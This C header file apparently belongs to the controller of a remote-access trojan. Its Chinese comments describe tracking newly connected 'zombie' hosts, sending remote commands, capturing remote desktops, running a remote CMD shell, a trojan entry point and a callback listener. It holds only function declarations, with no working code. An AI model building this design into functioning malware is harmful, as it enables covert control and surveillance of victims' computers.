#pragma once
#include "Header.h"

extern HWND hDelList;
//新主机上线
BOOL InsertNewItem(SOCKET s,SOCKADDR_IN sin);
//初始化ListControl控件
BOOL InitListControl(HWND hListControl);
//更新上线列表
BOOL RefreshListControl(HWND hListControl,int dwDel);
//获得肉鸡机器名称
char* GetHostName(SOCKADDR_IN sin,char* szHost);
//发送命令
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize);
//接收命令
BOOL RecvCmd(SOCKET sockfd);
//SOCKET出错处理,MainFunc.H里 清理缓冲区
BOOL SocketError(SOCKET sockfd);
//处理命令
BOOL DispatchCmd(SOCKET sockfd,int dwRecvSize);
//发送远程桌面命令
BOOL DeskViewRequest(SOCKET sockfd, HWND hDlg);
//接收数据
BOOL RecvBmpView(SOCKET sockfd, HWND hDlg);
//Bmp显示
BOOL DisplayDeskView(HWND hDlg, char* pData);
//控制接收固定长度数据
BOOL RecvData(SOCKET sockfd, char* pData, int dwSize);
//发送远程CMD命令要求
BOOL CmdRequest(SOCKET sockfd, HWND hDlg);
//接收CMD命令反馈信息
BOOL CmdReply(SOCKET sockfd, int dwRecvSize);
//木马线程初始化
BOOL TrojanEntry(void);
//上线端口监听
BOOL ListenProc(int port);

